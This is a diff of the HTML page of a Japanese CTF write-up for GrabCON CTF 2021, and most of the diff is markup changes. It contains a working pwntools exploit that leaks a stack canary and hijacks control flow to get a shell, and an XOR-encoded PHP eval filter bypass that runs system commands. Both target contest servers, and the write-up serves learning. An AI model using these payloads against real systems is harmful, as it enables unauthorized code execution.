@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/grabcon_ctf_2021/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="GrabCON CTF 2021 Writeup" />
 <meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.thecybergrabs.org/ 結構、Server Errorが出てましたね。。 750点を獲得し、174位でした。 チャレンジのリストです。 [Pwn]: Can you?" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/grabcon_ctf_2021/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/grabcon_ctf_2021/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-09-05T20:00:00+09:00" />
 <meta property="article:modified_time" content="2021-09-05T20:00:00+09:00" />
 <meta itemprop="name" content="GrabCON CTF 2021 Writeup">
-<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.thecybergrabs.org/ 結構、Server Errorが出てましたね。。 750点を獲得し、174位でした。 チャレンジのリストです。 [Pwn]: Can you?">
-<meta itemprop="datePublished" content="2021-09-05T20:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2021-09-05T20:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="1120">
-
-
-
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.thecybergrabs.org/ 結構、Server Errorが出てましたね。。 750点を獲得し、174位でした。 チャレンジのリストです。 [Pwn]: Can you?"><meta itemprop="datePublished" content="2021-09-05T20:00:00+09:00" />
+<meta itemprop="dateModified" content="2021-09-05T20:00:00+09:00" />
+<meta itemprop="wordCount" content="1106">
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="GrabCON CTF 2021 Writeup"/>
 <meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.thecybergrabs.org/ 結構、Server Errorが出てましたね。。 750点を獲得し、174位でした。 チャレンジのリストです。 [Pwn]: Can you?"/>
@@ -176,7 +172,7 @@
 <p>URL: <a href="https://ctf.thecybergrabs.org/">https://ctf.thecybergrabs.org/</a>
 <br /><br />
 結構、Server Errorが出てましたね。。</p>
-<p><br /></p>
+<br />
 <p>750点を獲得し、174位でした。</p>
 <p><br><br></p>
 <img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_Score1.png" alt="grabcon_CTF_2021_Score1.png">
@@ -203,7 +199,7 @@ nc 35.246.42.94 31337</p>
 <ul>
 <li>cancancan (ELF 32bit)</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>checksecを確認。</p>
 <pre>
@@ -214,11 +210,11 @@ nc 35.246.42.94 31337</p>
     PIE:      No PIE (0x8048000)
 </pre>
 <p>タイトルなどから、Canaryに関連したチャレンジなのがわかります。</p>
-<p><br />
-Ghidraでコードを確認します。</p>
+<br />
+Ghidraでコードを確認します。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -262,60 +258,60 @@ Ghidraでコードを確認します。</p>
 </span><span class="lnt">42
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">undefined4</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
-
-<span class="p">{</span>
-  <span class="n">init</span><span class="p">((</span><span class="n">EVP_PKEY_CTX</span> <span class="p">*)&amp;</span><span class="n">stack0x00000004</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;can you bypass me???&#34;</span><span class="p">);</span>
-  <span class="n">vuln</span><span class="p">();</span>
-  <span class="k">return</span> <span class="n">0</span><span class="p">;</span>
-<span class="p">}</span>
-
-
-<span class="n">void</span> <span class="n">vuln</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
-
-<span class="p">{</span>
-  <span class="n">int</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
-  <span class="n">char</span> <span class="p">*</span><span class="n">__buf</span><span class="p">;</span>
-  <span class="n">undefined4</span> <span class="n">uVar1</span><span class="p">;</span>
-  <span class="n">undefined4</span> <span class="n">uVar2</span><span class="p">;</span>
-  <span class="n">int</span> <span class="n">local_78</span><span class="p">;</span>
-  <span class="n">char</span> <span class="n">local_74</span> <span class="p">[</span><span class="n">100</span><span class="p">];</span>
-  <span class="n">int</span> <span class="n">local_10</span><span class="p">;</span>
-  
-  <span class="n">uVar2</span> <span class="p">=</span> <span class="n">0x80492d6</span><span class="p">;</span>
-  <span class="n">local_10</span> <span class="p">=</span> <span class="p">*(</span><span class="n">int</span> <span class="p">*)(</span><span class="n">in_GS_OFFSET</span> <span class="p">+</span> <span class="n">0x14</span><span class="p">);</span>
-  <span class="k">for</span> <span class="p">(</span><span class="n">local_78</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span> <span class="n">local_78</span> <span class="p">&lt;</span> <span class="n">2</span><span class="p">;</span> <span class="n">local_78</span> <span class="p">=</span> <span class="n">local_78</span> <span class="p">+</span> <span class="n">1</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">uVar1</span> <span class="p">=</span> <span class="n">0x200</span><span class="p">;</span>
-    <span class="n">__buf</span> <span class="p">=</span> <span class="n">local_74</span><span class="p">;</span>
-<span class="hl">    <span class="n">read</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="n">__buf</span><span class="p">,</span><span class="n">0x200</span><span class="p">);</span>
-</span><span class="hl">    <span class="n">printf</span><span class="p">(</span><span class="n">local_74</span><span class="p">,</span><span class="n">__buf</span><span class="p">,</span><span class="n">uVar1</span><span class="p">,</span><span class="n">uVar2</span><span class="p">);</span>
-</span>  <span class="p">}</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="p">!=</span> <span class="p">*(</span><span class="n">int</span> <span class="p">*)(</span><span class="n">in_GS_OFFSET</span> <span class="p">+</span> <span class="n">0x14</span><span class="p">))</span> <span class="p">{</span>
-    <span class="n">__stack_chk_fail_local</span><span class="p">();</span>
-  <span class="p">}</span>
-  <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span>
-
-
-<span class="n">void</span> <span class="n">win</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
-
-<span class="p">{</span>
-  <span class="n">system</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">);</span>
-  <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">init</span><span class="p">((</span><span class="n">EVP_PKEY_CTX</span> <span class="p">*)&amp;</span><span class="n">stack0x00000004</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;can you bypass me???&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">vuln</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mf">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">void</span> <span class="n">vuln</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">int</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">char</span> <span class="p">*</span><span class="n">__buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined4</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined4</span> <span class="n">uVar2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">int</span> <span class="n">local_78</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">char</span> <span class="n">local_74</span> <span class="p">[</span><span class="mf">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">int</span> <span class="n">local_10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">uVar2</span> <span class="p">=</span> <span class="n">0x80492d6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="p">=</span> <span class="p">*(</span><span class="n">int</span> <span class="p">*)(</span><span class="n">in_GS_OFFSET</span> <span class="p">+</span> <span class="n">0x14</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">local_78</span> <span class="p">=</span> <span class="mf">0</span><span class="p">;</span> <span class="n">local_78</span> <span class="p">&lt;</span> <span class="mf">2</span><span class="p">;</span> <span class="n">local_78</span> <span class="p">=</span> <span class="n">local_78</span> <span class="p">+</span> <span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uVar1</span> <span class="p">=</span> <span class="n">0x200</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__buf</span> <span class="p">=</span> <span class="n">local_74</span><span class="p">;</span>
+</span></span><span class="line hl"><span class="cl">    <span class="n">read</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="n">__buf</span><span class="p">,</span><span class="n">0x200</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="n">local_74</span><span class="p">,</span><span class="n">__buf</span><span class="p">,</span><span class="n">uVar1</span><span class="p">,</span><span class="n">uVar2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="p">!=</span> <span class="p">*(</span><span class="n">int</span> <span class="p">*)(</span><span class="n">in_GS_OFFSET</span> <span class="p">+</span> <span class="n">0x14</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__stack_chk_fail_local</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">void</span> <span class="n">win</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">system</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p><br />
-Buffer Overflow と、Format String Bug (書式文字列攻撃) の両方の脆弱性がありますね。</p>
-<p><br />
-&ldquo;ctf 32bit canary fsb leak&rdquo; でググったら、以下のWikiでほぼそのまんまの内容が見つかりました。</p>
+<br />
+Buffer Overflow と、Format String Bug (書式文字列攻撃) の両方の脆弱性がありますね。
+<br />
+"ctf 32bit canary fsb leak" でググったら、以下のWikiでほぼそのまんまの内容が見つかりました。
 <p><a href="https://wiki.vaala.cloud/pwn/linux/mitigation/canary/#canary-leaks-canary">https://wiki.vaala.cloud/pwn/linux/mitigation/canary/#canary-leaks-canary</a></p>
-<p><br /></p>
+<br />
 <p>書いたコード（ほぼ流用）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -334,36 +330,34 @@ Buffer Overflow と、Format String Bug (書式文字列攻撃) の両方の脆�
 </span><span class="lnt">17
 </span><span class="lnt">18
 </span><span class="lnt">19
-</span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;cancancan&#39;</span>
-
-<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.246.42.94&#39;</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>
-
-<span class="c1"># Leak Canary</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;can you bypass me???&#34;</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">100</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span>
-<span class="n">Canary</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span><span class="o">-</span><span class="mh">0xa</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Canary:&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">Canary</span><span class="p">))</span>
-
-<span class="c1"># Bypass Canary</span>
-<span class="n">addr_win</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./cancancan&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;win&#34;</span><span class="p">]</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">100</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">Canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_win</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;cancancan&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.246.42.94&#39;</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Leak Canary</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;can you bypass me???&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">100</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Canary</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span><span class="o">-</span><span class="mh">0xa</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Canary:&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">Canary</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Bypass Canary</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr_win</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./cancancan&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;win&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">100</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">Canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_win</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-Wikiではあんまり説明がなかったので補足すると、pwntoolsのsendlineは最後に改行 (&quot;\n&rdquo;) が入るので101バイトが書き込まれ、(&quot;\n&rdquo;) で Canary の &ldquo;\x00&rdquo; 部分が上書きされます。</p>
-<p>これによって、printfの結果がもともと&rdquo;\x00&quot;で止まるはずだったのが、Canaryを含めて出力されます。</p>
-<p>(&quot;\n&rdquo;)は &ldquo;\x0a&rdquo; なので、-0xa をしています。0xFFFFFF00 でゼロクリアでも同じ結果になるはず。</p>
-<p><br /></p>
+</div><br />
+Wikiではあんまり説明がなかったので補足すると、pwntoolsのsendlineは最後に改行 ("\n") が入るので101バイトが書き込まれ、("\n") で Canary の "\x00" 部分が上書きされます。
+<p>これによって、printfの結果がもともと&quot;\x00&quot;で止まるはずだったのが、Canaryを含めて出力されます。</p>
+<p>(&quot;\n&quot;)は &ldquo;\x0a&rdquo; なので、-0xa をしています。0xFFFFFF00 でゼロクリアでも同じ結果になるはず。</p>
+<br />
 <p>Flag: <code>GrabCON{Byp4ss_can4ry_1s_fun!}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -375,13 +369,13 @@ Wikiではあんまり説明がなかったので補足すると、pwntoolsのse
 <br /><br />
 Link</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-1">Solution</h3>
 <p>ウェブサイトにアクセスすると、計算用のフォームと、PHPコードが表示されます。</p>
 <p>PHPのコード部分は以下でした。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -399,52 +393,52 @@ Link</p>
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-
-<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;eq&#34;</span><span class="p">])){</span>
-    
-    <span class="nv">$eq</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;eq&#34;</span><span class="p">];</span>
-
-    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z`]+/&#34;</span><span class="p">,</span><span class="nv">$eq</span><span class="p">)){</span>
-        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;BAD.&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">echo</span> <span class="s2">&#34;Result: &#34;</span><span class="p">;</span>
-    <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo &#34;</span> <span class="o">.</span> <span class="nv">$eq</span> <span class="o">.</span> <span class="s2">&#34; ;&#34;</span><span class="p">);</span>
-<span class="p">}</span><span class="k">else</span><span class="p">{</span>
-  <span class="k">echo</span> <span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>  
-<span class="p">}</span>
-
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;eq&#34;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nv">$eq</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;eq&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z`]+/&#34;</span><span class="p">,</span><span class="nv">$eq</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;BAD.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Result: &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo &#34;</span> <span class="o">.</span> <span class="nv">$eq</span> <span class="o">.</span> <span class="s2">&#34; ;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-アルファベットを使わずにコマンドを入力しeval()に渡す、ということをしないといけません。</p>
-<p><br />
-これも、ググって調べると、どうやら Root-Me の「PHP Eval」という問題と同じみたいです。</p>
+</div><br />
+アルファベットを使わずにコマンドを入力しeval()に渡す、ということをしないといけません。
+<br />
+これも、ググって調べると、どうやら Root-Me の「PHP Eval」という問題と同じみたいです。
 <p>以下の Write Up を参考にさせていただきました。<br>
 <a href="https://joshuanatan.medium.com/root-me-web-server-php-eval-f77584cae128">https://joshuanatan.medium.com/root-me-web-server-php-eval-f77584cae128</a></p>
-<p><br />
-コードは上記の Write Up をそのまま使ったので、ここには載せません。</p>
-<p><br /></p>
+<br />
+コードは上記の Write Up をそのまま使ったので、ここには載せません。
+<br />
 <p>system(&ldquo;ls -al&rdquo;)を実行したいとすると、</p>
 <pre>
 system = ('('^'[').('$'^']').('('^'[').(')'^']').('%'^'@').('-'^'@')
 ls -al / = (','^'@').('('^'[').('['^'{').'-'.('!'^'@').(','^'@').('['^'{').'/'
 </pre>
-<p><br /></p>
+<br />
 <p>以下をPOSTすることになります。</p>
 <pre>
 <font color="red">(</font>('('^'[').('$'^']').('('^'[').(')'^']').('%'^'@').('-'^'@')<font color="red">)</font><font color="red">(</font>(','^'@').('('^'[').('['^'{').'-'.('!'^'@').(','^'@').('['^'{').'/'<font color="red">)</font>
 </pre>
 <p>このようにカッコ（<font color="red">赤い</font>部分）をつけないと、単純にechoでコマンド自体が表示されて、コマンドの結果が得られません。</p>
-<p><br /></p>
+<br />
 <p><code>ls -al /</code> を確認したら、/flagggg.txt があるのがわかります。</p>
 <p>ここで、</p>
 <p><code>cat /flagggg.txt</code> をやろうとすると、以下のようにエラーになってしまいました。</p>
 <img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_basic_calc.png" alt="grabcon_CTF_2021_basic_calc.png">
-<p><br /></p>
+<br />
 <p><code>cat /*.txt</code> にて、フラグを得ることができました。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>GrabCON{b4by_php_f0r_y0u}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -500,7 +494,7 @@ ls -al / = (','^'@').('('^'[').('['^'{').'-'.('!'^'@').(','^'@').('['^'{').'/'
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -535,20 +529,21 @@ ls -al / = (','^'@').('('^'[').('['^'{').'-'.('!'^'@').(','^'@').('['^'{').'/'
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
